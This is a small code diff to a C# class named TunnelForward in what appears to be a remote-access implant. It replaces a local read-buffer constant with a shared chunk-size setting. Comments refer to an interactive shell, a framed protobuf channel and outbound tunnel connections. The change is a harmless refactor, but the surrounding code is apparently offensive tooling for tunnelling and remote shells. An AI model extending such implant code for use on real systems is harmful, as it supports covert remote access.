@@ -29,11 +29,6 @@ namespace Rod.Implant.Internal;
 /// </summary>
 internal static class TunnelForward
 {
-    // The down pump's read buffer: one read is one output chunk, the same
-    // budget the interactive shell's output pumps use -- well inside the
-    // frame-layer sizing with protobuf overhead to spare.
-    private const int OutputChunkBytes = 16 * 1024;
-
     // How long the outbound connect may take before the tunnel is refused: a
     // blackholed host must fail the task, not park the channel until the
     // stream dies.
@@ -171,7 +166,7 @@ internal static class TunnelForward
     {
         long read = 0;
         var socket = client.GetStream();
-        var buffer = new byte[OutputChunkBytes];
+        var buffer = new byte[Chunking.ChannelOutputChunkBytes];
         while (true)
         {
             int received;
